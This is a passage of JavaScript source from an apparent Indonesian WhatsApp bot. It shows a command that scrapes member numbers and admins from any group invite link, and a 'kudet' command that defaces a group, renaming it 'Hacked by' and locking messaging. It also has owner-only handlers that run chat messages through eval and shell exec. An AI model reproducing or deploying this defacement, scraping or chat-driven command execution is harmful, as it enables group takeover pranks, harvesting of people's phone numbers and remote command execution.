            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}${enter}*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}${enter}${enter}*Kontak yang tersimpan*${enter}`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}${enter}`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
       case 'kudet':
       if (!mek.key.fromMe && !isOwner) return reply('owner only')
if (!isBotGroupAdmins) return reply('bot bukan adm')
if (!isGroup) return
let anu = fs.readFileSync(`./image/${thumbnail}`)
alpha.updateProfilePicture(from, anu)
alpha.groupUpdateSubject(from, `Hacked by ${creator}`)
alpha.groupUpdateDescription(from, `Mampos Gw Kudet`)
alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
fakegroup('Cuman hack boongan☺️')
}, 8000)
break

default:

if (budy.startsWith('>')){
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
try {
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner && !isCoOwner ) return fakestatus('```OWNER ONLY```')
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`ALPHABOT :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
const listTag = `${ownerNumbers}`
const partiNum = (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.contextInfo.participant : ''
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (mek.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
alpha.sendMessage(from, sendNye, sticker, {quoted:mek, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
if (budy.includes(`@${targetpc}`)) {
if (antitags === false) return
if (mek.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
alpha.sendMessage(from, sendNye, sticker, {quoted:mek, contextInfo:{forwardingScore: 800, isForwarded: true}})
}

}
if (isGroup && budy != undefined) {
} else {
console.log(color('[ PVT ]', 'aqua'), 'SELF - BOT', color(pushname))
}		
} catch (e) {
e = String(e)
if (!e.includes("this.isZero")) {
console.log('Message : %s', color(e, 'green'))
}
}
}
